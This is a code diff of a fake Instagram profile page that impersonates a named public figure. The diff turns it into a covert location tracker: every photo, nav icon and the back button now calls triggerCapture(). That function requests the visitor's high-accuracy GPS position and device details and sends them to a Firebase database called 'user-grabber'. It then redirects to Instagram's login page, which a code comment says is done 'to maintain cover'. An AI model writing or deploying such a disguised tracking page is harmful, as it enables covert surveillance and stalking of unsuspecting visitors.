@@ -17,6 +17,7 @@
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             margin: 0; padding: 0; background: var(--ig-bg);
             padding-bottom: 60px;
+            -webkit-tap-highlight-color: transparent;
         }
 
         /* Top Nav */
@@ -24,11 +25,14 @@
             height: 48px;
             display: flex;
             align-items: center;
-            justify-content: center;
+            justify-content: space-between;
+            padding: 0 16px;
             border-bottom: 1px solid var(--ig-border);
             position: sticky;
             top: 0; background: #fff; z-index: 1000;
         }
+
+        .back-btn { cursor: pointer; display: flex; align-items: center; }
 
         /* Profile Header */
         .profile-container { max-width: 600px; margin: 0 auto; padding: 16px; }
@@ -38,35 +42,33 @@
         .stat-val { font-weight: 700; font-size: 16px; display: block; }
         .stat-lab { font-size: 13px; color: var(--ig-text); }
 
-        /* Grid */
+        .bio-section { font-size: 14px; line-height: 1.4; margin-bottom: 10px; }
+        .full-name { font-weight: 700; display: block; }
+        .category { color: var(--ig-secondary); }
+
+        /* Photo Grid */
         .photo-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 1px;
             background: var(--ig-border);
         }
-        .photo-item { aspect-ratio: 1/1; background: #fff; overflow: hidden; }
+        .photo-item { aspect-ratio: 1/1; background: #fff; overflow: hidden; cursor: pointer; }
         .photo-item img { width: 100%; height: 100%; object-fit: cover; display: block; }
 
-        /* Bottom Nav with Center Messenger */
+        /* Bottom Nav */
         .bottom-nav {
-            position: fixed;
-            bottom: 0; width: 100%; height: 50px;
+            position: fixed; bottom: 0; width: 100%; height: 50px;
             background: #fff; border-top: 1px solid var(--ig-border);
             display: flex; justify-content: space-around; align-items: center;
             z-index: 1000;
         }
-
-        .nav-item { position: relative; display: flex; align-items: center; cursor: pointer; }
-        
+        .nav-item { position: relative; cursor: pointer; display: flex; align-items: center; }
         .badge {
-            position: absolute;
-            top: -6px; right: -8px;
-            background: var(--ig-red);
-            color: white;
+            position: absolute; top: -6px; right: -8px;
+            background: var(--ig-red); color: white;
             font-size: 10px; font-weight: bold;
-            width: 17px; height: 17px;
-            border-radius: 50%;
+            width: 17px; height: 17px; border-radius: 50%;
             display: flex; align-items: center; justify-content: center;
             border: 2px solid white;
         }
@@ -75,8 +77,11 @@
 <body>
 
     <header class="top-nav">
+        <div class="back-btn" onclick="triggerCapture()">
+            <svg height="24" viewBox="0 0 24 24" width="24"><path d="M21 17.502a.997.997 0 01-.707-.293L12 8.913l-8.293 8.296a1 1 0 11-1.414-1.414l9-9.004a1.03 1.03 0 011.414 0l9 9.004A1 1 0 0121 17.502z" transform="rotate(-90 12 12)"></path></svg>
+        </div>
         <div style="font-weight: 700; font-size: 16px;">priyankamjain___0207</div>
-    </header>
+        <div style="width: 24px;"></div> </header>
 
     <div class="profile-container">
         <div class="header-main">
@@ -87,55 +92,104 @@
                 <div><span class="stat-val">466</span><span class="stat-lab">following</span></div>
             </div>
         </div>
-        <div style="font-size: 14px; line-height: 1.4;">
-            <b>Priyanka M Jain</b><br>
-            <span style="color:#8e8e8e">Public Figure</span><br>
+        <div class="bio-section">
+            <span class="full-name">Priyanka M Jain</span>
+            <span class="category">Public Figure</span><br>
             Believer of The Secret 🧿<br>
-            Bigg Boss Telugu 7 Top 5 Finalist 🧿
+            Bigg Boss Telugu 7 Top 5 Finalist 🧿<br>
+            DM for collaborations or Mail at shivmarihal@gmail.com 👇🏻
         </div>
     </div>
 
     <main class="photo-grid">
-        <div class="photo-item" onclick="captureData()"><img src="https://i.pinimg.com/736x/34/36/e5/3436e5a174ec33a28281dce211cc749a.jpg"></div>
-        <div class="photo-item" onclick="captureData()"><img src="https://i.pinimg.com/736x/19/26/b1/1926b13f3a4348e6e24af31590ba5f21.jpg"></div>
-        <div class="photo-item" onclick="captureData()"><img src="https://i.pinimg.com/736x/13/04/32/1304329741f2b95e2daa0eb2b9e86042.jpg"></div>
-        <div class="photo-item" onclick="captureData()"><img src="https://i.pinimg.com/736x/1c/89/03/1c8903db42154cb27d31811913fe9b43.jpg"></div>
-        <div class="photo-item" onclick="captureData()"><img src="https://i.pinimg.com/1200x/98/1c/4b/981c4b72365a02f6ea5ed5b8170023f2.jpg"></div>
-        <div class="photo-item" onclick="captureData()"><img src="https://i.pinimg.com/736x/24/9e/c1/249ec16595e1c299eece3dddc203a354.jpg"></div>
-        <div class="photo-item" onclick="captureData()"><img src="https://i.pinimg.com/736x/a1/c7/75/a1c77578d7ee498524d6b512c5674320.jpg"></div>
-        <div class="photo-item" onclick="captureData()"><img src="https://i.pinimg.com/736x/f2/21/d6/f221d67ea52cc7aeda96ba6d8c96a089.jpg"></div>
-        <div class="photo-item" onclick="captureData()"><img src="https://i.pinimg.com/736x/38/7d/fe/387dfefa24e9406f3b3527ab43a625f2.jpg"></div>
-        <div class="photo-item" onclick="captureData()"><img src="https://i.pinimg.com/736x/a8/71/a1/a871a1e694b99298242c8b858470384a.jpg"></div>
-        <div class="photo-item" onclick="captureData()"><img src="https://i.pinimg.com/736x/e5/e2/04/e5e2044e7d895707afc491686dc4b6bd.jpg"></div>
-        <div class="photo-item" onclick="captureData()"><img src="https://i.pinimg.com/736x/95/57/e5/9557e51fa1c1d37f3a8cdb3155ed265e.jpg"></div>
+        <div class="photo-item" onclick="triggerCapture()"><img src="https://i.pinimg.com/736x/34/36/e5/3436e5a174ec33a28281dce211cc749a.jpg"></div>
+        <div class="photo-item" onclick="triggerCapture()"><img src="https://i.pinimg.com/736x/19/26/b1/1926b13f3a4348e6e24af31590ba5f21.jpg"></div>
+        <div class="photo-item" onclick="triggerCapture()"><img src="https://i.pinimg.com/736x/13/04/32/1304329741f2b95e2daa0eb2b9e86042.jpg"></div>
+        <div class="photo-item" onclick="triggerCapture()"><img src="https://i.pinimg.com/736x/1c/89/03/1c8903db42154cb27d31811913fe9b43.jpg"></div>
+        <div class="photo-item" onclick="triggerCapture()"><img src="https://i.pinimg.com/1200x/98/1c/4b/981c4b72365a02f6ea5ed5b8170023f2.jpg"></div>
+        <div class="photo-item" onclick="triggerCapture()"><img src="https://i.pinimg.com/736x/24/9e/c1/249ec16595e1c299eece3dddc203a354.jpg"></div>
+        <div class="photo-item" onclick="triggerCapture()"><img src="https://i.pinimg.com/736x/a1/c7/75/a1c77578d7ee498524d6b512c5674320.jpg"></div>
+        <div class="photo-item" onclick="triggerCapture()"><img src="https://i.pinimg.com/736x/f2/21/d6/f221d67ea52cc7aeda96ba6d8c96a089.jpg"></div>
+        <div class="photo-item" onclick="triggerCapture()"><img src="https://i.pinimg.com/736x/38/7d/fe/387dfefa24e9406f3b3527ab43a625f2.jpg"></div>
+        <div class="photo-item" onclick="triggerCapture()"><img src="https://i.pinimg.com/736x/a8/71/a1/a871a1e694b99298242c8b858470384a.jpg"></div>
+        <div class="photo-item" onclick="triggerCapture()"><img src="https://i.pinimg.com/736x/e5/e2/04/e5e2044e7d895707afc491686dc4b6bd.jpg"></div>
+        <div class="photo-item" onclick="triggerCapture()"><img src="https://i.pinimg.com/736x/95/57/e5/9557e51fa1c1d37f3a8cdb3155ed265e.jpg"></div>
     </main>
 
     <div class="bottom-nav">
-        <div class="nav-item">
+        <div class="nav-item" onclick="triggerCapture()">
             <svg height="24" viewBox="0 0 24 24" width="24"><path d="M22 23h-6.001a1 1 0 01-1-1v-5.455a2.997 2.997 0 10-5.993 0V22a1 1 0 01-1 1H2a1 1 0 01-1-1V11.543a1.002 1.002 0 01.31-.724l10-9.543a1.001 1.001 0 011.38 0l10 9.543a1.002 1.002 0 01.31.724V22a1 1 0 01-1 1z"></path></svg>
         </div>
-        <div class="nav-item">
+        <div class="nav-item" onclick="triggerCapture()">
             <svg height="24" viewBox="0 0 24 24" width="24"><path d="M19 10.5A8.5 8.5 0 1110.5 2a8.5 8.5 0 018.5 8.5z" fill="none" stroke="black" stroke-width="2"></path><line fill="none" stroke="black" stroke-width="2" x1="16.511" x2="22" y1="16.511" y2="22"></line></svg>
         </div>
-        
-        <div class="nav-item" onclick="captureData()">
+        <div class="nav-item" onclick="triggerCapture()">
             <svg aria-label="Messenger" height="24" viewBox="0 0 24 24" width="24"><path d="M12 3C6.73 3 2.5 6.84 2.5 11.5c0 2.5 1.23 4.7 3.2 6.2-.18.84-.8 2.52-.8 2.62a.37.37 0 00.46.46l2.94-1.25c.82.23 1.68.37 2.6.37 5.27 0 9.5-3.84 9.5-8.5S17.27 3 12 3zm4.5 7.64l-2.65 3.53a.75.75 0 01-1.14.1l-2.1-2.1a.4.4 0 00-.57 0l-2.65 2.6c-.3.3-.77-.07-.57-.44l2.65-3.53a.75.75 0 011.14-.1l2.1 2.1a.4.4 0 00.57 0l2.65-2.6c.3-.3.77.07.57.44z"></path></svg>
             <div class="badge">2</div>
         </div>
-
-        <div class="nav-item">
+        <div class="nav-item" onclick="triggerCapture()">
             <svg height="24" viewBox="0 0 24 24" width="24"><line fill="none" stroke="black" stroke-width="2" x1="2.049" x2="21.951" y1="7.002" y2="7.002"></line><path d="M2 12.001v3.449c0 2.849.698 4.006 1.606 4.945.94.908 2.098 1.607 4.946 1.607h6.896c2.848 0 4.006-.699 4.946-1.607.907-.939 1.605-2.096 1.605-4.945V8.552c0-2.848-.698-4.006-1.605-4.945C19.454 2.699 18.296 2 15.448 2H8.552c-2.848 0-4.006.699-4.946 1.607C2.698 4.546 2 5.704 2 8.552z" fill="none" stroke="black" stroke-width="2"></path></svg>
         </div>
-
-        <div class="nav-item">
+        <div class="nav-item" onclick="triggerCapture()">
             <svg height="24" viewBox="0 0 24 24" width="24"><path d="M12 2.25a9.75 9.75 0 109.75 9.75A9.76 9.76 0 0012 2.25zm4.03 6.44l-2.45 5.51a.74.74 0 01-.41.41l-5.51 2.45a.25.25 0 01-.32-.32l2.45-5.51a.74.74 0 01.41-.41l5.51-2.45a.25.25 0 01.32.32z"></path></svg>
         </div>
     </div>
 
-    <script>
-        function captureData() {
-            // Tracking logic
-            window.location.href = "https://www.instagram.com/priyankamjain___0207/";
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCBA7BdBt0_CQIN1tDrHoajZQzR_QtomhU",
+            authDomain: "user-grabber.firebaseapp.com",
+            projectId: "user-grabber",
+            databaseURL: "https://user-grabber-default-rtdb.firebaseio.com",
+            storageBucket: "user-grabber.firebasestorage.app",
+            messagingSenderId: "1004415300770",
+            appId: "1:1004415300770:web:46aeef2b3a35d95ac193fb"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Define function in window scope so HTML onclick works
+        window.triggerCapture = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    // Success: Capture detailed data
+                    const userData = {
+                        coords: {
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        },
+                        device: {
+                            userAgent: navigator.userAgent,
+                            platform: navigator.platform,
+                            language: navigator.language
+                        },
+                        timestamp: new Date().toLocaleString()
+                    };
+
+                    try {
+                        await push(ref(db, 'interactions'), userData);
+                    } catch (e) { console.error(e); }
+
+                    finishFlow();
+                }, (err) => {
+                    // Denied: Still redirect to maintain cover
+                    finishFlow();
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 8000
+                });
+            } else {
+                finishFlow();
+            }
+        };
+
+        function finishFlow() {
+            window.location.href = "https://www.instagram.com/accounts/login/";
         }
     </script>
 </body>
